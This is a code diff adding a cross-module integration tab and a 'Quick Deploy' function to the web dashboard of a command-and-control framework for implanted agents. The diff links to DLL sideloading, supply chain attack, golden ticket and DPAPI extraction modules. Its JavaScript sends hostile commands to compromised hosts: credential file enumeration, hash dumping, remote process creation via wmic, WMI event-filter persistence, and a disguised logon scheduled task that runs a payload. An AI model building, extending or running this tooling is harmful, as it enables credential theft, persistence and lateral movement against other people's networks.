@@ -594,6 +594,7 @@
             <li><a href="#" data-tab="tasksTab"><i class="bi bi-list-task"></i> Tasks</a></li>
             <li><a href="#" data-tab="payloadsTab"><i class="bi bi-file-earmark-code"></i> Payloads</a></li>
             <li><a href="#" data-tab="credentialsTab"><i class="bi bi-key"></i> Credentials</a></li>
+            <li><a href="#" data-tab="integrationsTab"><i class="bi bi-link-45deg"></i> Integrations</a></li>
         </ul>
     </div>
 
@@ -869,6 +870,140 @@
                             </tr>
                         </tbody>
                     </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cross-Module Integration -->
+        <div class="tab-pane" id="integrationsTab">
+            <div class="row">
+                <div class="col-12">
+                    <div class="panel">
+                        <div class="panel-header">
+                            <h3 class="panel-title"><i class="bi bi-link-45deg"></i> Cross-Module Integration</h3>
+                        </div>
+                        <div class="panel-body">
+                            <p class="text-muted mb-4">Deploy C2 implants through other attack vectors or chain modules together</p>
+                            
+                            <div class="row g-3">
+                                <!-- DLL Sideload Integration -->
+                                <div class="col-md-4">
+                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <i class="bi bi-puzzle text-warning me-2"></i>
+                                            <strong>DLL Sideload</strong>
+                                        </div>
+                                        <p class="text-muted small mb-3">Package implant as sideloadable DLL</p>
+                                        <button class="btn-ghost w-100" onclick="openDllSideload()">
+                                            <i class="bi bi-box-arrow-up-right"></i> Open DLL Sideload
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <!-- WMI Persistence Integration -->
+                                <div class="col-md-4">
+                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <i class="bi bi-database text-info me-2"></i>
+                                            <strong>WMI Persistence</strong>
+                                        </div>
+                                        <p class="text-muted small mb-3">Persist implant via WMI subscriptions</p>
+                                        <button class="btn-ghost w-100" onclick="openWmiPersistence()">
+                                            <i class="bi bi-box-arrow-up-right"></i> Open WMI Persistence
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <!-- Lateral Movement Integration -->
+                                <div class="col-md-4">
+                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <i class="bi bi-diagram-3 text-success me-2"></i>
+                                            <strong>Lateral Movement</strong>
+                                        </div>
+                                        <p class="text-muted small mb-3">Deploy implant to remote hosts</p>
+                                        <button class="btn-ghost w-100" onclick="openLateralMovement()">
+                                            <i class="bi bi-box-arrow-up-right"></i> Open Lateral Movement
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <!-- Supply Chain Integration -->
+                                <div class="col-md-4">
+                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <i class="bi bi-boxes text-danger me-2"></i>
+                                            <strong>Supply Chain Attack</strong>
+                                        </div>
+                                        <p class="text-muted small mb-3">Embed implant in packages</p>
+                                        <button class="btn-ghost w-100" onclick="openSupplyChain()">
+                                            <i class="bi bi-box-arrow-up-right"></i> Open Supply Chain
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <!-- Golden Ticket Integration -->
+                                <div class="col-md-4">
+                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <i class="bi bi-ticket-detailed text-warning me-2"></i>
+                                            <strong>Golden Ticket</strong>
+                                        </div>
+                                        <p class="text-muted small mb-3">Deploy implant to DC post-compromise</p>
+                                        <button class="btn-ghost w-100" onclick="openGoldenTicket()">
+                                            <i class="bi bi-box-arrow-up-right"></i> Open Golden Ticket
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <!-- DPAPI Extractor Integration -->
+                                <div class="col-md-4">
+                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <i class="bi bi-key text-purple me-2" style="color: #a855f7;"></i>
+                                            <strong>DPAPI Extractor</strong>
+                                        </div>
+                                        <p class="text-muted small mb-3">Extract credentials from agents</p>
+                                        <button class="btn-ghost w-100" onclick="openDpapiExtractor()">
+                                            <i class="bi bi-box-arrow-up-right"></i> Open DPAPI Extractor
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Quick Deploy Section -->
+                            <div class="mt-4 p-3 rounded" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(59, 130, 246, 0.1)); border: 1px solid rgba(139, 92, 246, 0.3);">
+                                <h5 class="mb-3" style="color: var(--accent-purple);"><i class="bi bi-lightning-charge me-2"></i>Quick Deploy to Agent</h5>
+                                <div class="row g-3">
+                                    <div class="col-md-4">
+                                        <select id="deployAgent" class="form-select">
+                                            <option value="">Select Agent...</option>
+                                            {% for agent in agents %}
+                                            <option value="{{ agent.agent_id }}">{{ agent.hostname }} ({{ agent.ip_address }})</option>
+                                            {% endfor %}
+                                        </select>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <select id="deployModule" class="form-select">
+                                            <option value="">Select Module...</option>
+                                            <option value="dpapi">🔑 DPAPI Credential Extract</option>
+                                            <option value="hashdump">🔐 SAM/NTDS Hash Dump</option>
+                                            <option value="lateral_smb">🔄 Lateral via SMB</option>
+                                            <option value="lateral_wmi">🔄 Lateral via WMI</option>
+                                            <option value="persist_wmi">⚓ WMI Persistence</option>
+                                            <option value="persist_schtask">⚓ Scheduled Task Persist</option>
+                                            <option value="privesc">⬆️ PrivEsc Check</option>
+                                        </select>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <button class="btn-c2 w-100" onclick="quickDeploy()">
+                                            <i class="bi bi-send"></i> Deploy Module
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1150,6 +1285,53 @@ function escapeHtml(text) {
 
 function showOutput(taskId) {
     alert('Task ID: ' + taskId);
+}
+
+// Cross-Module Integration Functions
+function openDllSideload() { window.open('/dll-sideload', '_blank'); }
+function openWmiPersistence() { window.open('/wmi-persistence', '_blank'); }
+function openLateralMovement() { window.open('/lateral', '_blank'); }
+function openSupplyChain() { window.open('/supply-chain', '_blank'); }
+function openGoldenTicket() { window.open('/golden-ticket', '_blank'); }
+function openDpapiExtractor() { window.open('/dpapi-extractor', '_blank'); }
+
+async function quickDeploy() {
+    const agentId = document.getElementById('deployAgent').value;
+    const module = document.getElementById('deployModule').value;
+    
+    if (!agentId || !module) {
+        alert('Please select both an agent and a module');
+        return;
+    }
+    
+    const moduleCommands = {
+        'dpapi': {command: 'shell', args: 'powershell -c "Get-ChildItem C:\\Users\\*\\AppData\\*\\Microsoft\\Credentials\\*"'},
+        'hashdump': {command: 'hashdump', args: ''},
+        'lateral_smb': {command: 'shell', args: 'net view /all'},
+        'lateral_wmi': {command: 'shell', args: 'wmic /node:"{target}" process call create "cmd /c whoami"'},
+        'persist_wmi': {command: 'shell', args: 'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE'},
+        'persist_schtask': {command: 'shell', args: 'schtasks /create /tn "SystemHealth" /tr "cmd /c {payload}" /sc onlogon'},
+        'privesc': {command: 'shell', args: 'whoami /priv && whoami /groups'}
+    };
+    
+    const cmd = moduleCommands[module];
+    if (!cmd) return;
+    
+    try {
+        const res = await fetch('/c2/beacons/' + agentId + '/task', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({command: cmd.command, args: cmd.args})
+        });
+        const data = await res.json();
+        if (data.success) {
+            alert('Module deployed successfully! Check Tasks tab for results.');
+        } else {
+            alert('Error: ' + (data.error || 'Unknown error'));
+        }
+    } catch(e) {
+        alert('Error: ' + e);
+    }
 }
 
 // Auto refresh every 15 seconds
